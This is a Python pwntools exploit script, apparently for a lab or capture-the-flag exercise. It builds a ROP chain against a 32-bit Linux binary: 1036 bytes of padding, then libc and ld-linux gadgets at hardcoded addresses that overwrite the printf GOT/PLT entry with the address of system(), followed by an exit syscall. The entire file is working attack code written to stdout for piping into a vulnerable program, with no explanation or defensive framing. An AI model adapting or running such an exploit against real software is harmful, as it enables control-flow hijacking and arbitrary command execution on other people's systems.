#!/usr/bin/python3
import sys
from pwn import p32

plt_printf_address = 0x0804c004
# plt_printf_address = 0xdeadbeef
system_address = 0xf7dcd430

base_address_ld_linux = 0xf7fc9000 # address in the code where /lib/ld-linux.so.2 is loaded
base_address_libc = 0xf7d7d000 # address in the code where  /lib/i386-linux-gnu/libc.so.6 is loaded

pop_eax = base_address_libc + 0x0012b311
pop_edx = base_address_libc + 0x0003be0d

mov_into_edx_eax = base_address_ld_linux + 0x0001250b

mov_eax_1 = base_address_libc + 0x0005cdb5
int_0x80 = base_address_libc + 0x00039ed4
# mov [plt_printf_address], system_address
payload = b'A'*1036

payload += p32(pop_eax)
payload += p32(system_address) # eax = system_address

payload += p32(pop_edx)
payload += p32(plt_printf_address) # edx = plt_printf_address

payload += p32(mov_into_edx_eax) # mov [plt_printf_address], x`system_address

payload += p32(mov_eax_1) # mov eax, 1
payload += p32(int_0x80) # int 0x80

sys.stdout.buffer.write(payload)
